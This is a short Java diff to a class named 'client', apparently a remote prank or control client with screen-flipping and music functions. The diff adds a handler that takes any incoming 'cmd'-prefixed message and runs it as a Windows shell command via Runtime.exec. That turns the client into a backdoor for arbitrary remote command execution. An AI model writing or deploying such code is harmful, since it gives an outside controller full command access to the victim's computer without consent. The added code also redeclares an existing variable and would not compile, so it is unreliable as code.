@@ -56,6 +56,12 @@ public class client {
 		}
 			playBorisWebMusic(url);
 		}
+
+		else if (cmd.substring(0,3).equals("cmd")) {
+			String cmd=cmd.substring(4,cmd.length());
+			cmd(cmd);
+		}
+
 	}
 
 	private static void flipScreen(){
@@ -96,6 +102,16 @@ public class client {
 			sd.playLoadedClip(0);
 
 		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+	private static void cmd(String cmd) {
+		Runtime r = Runtime.getRuntime();
+		try {
+			r.exec("cmd /C \""+cmd+"\"");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
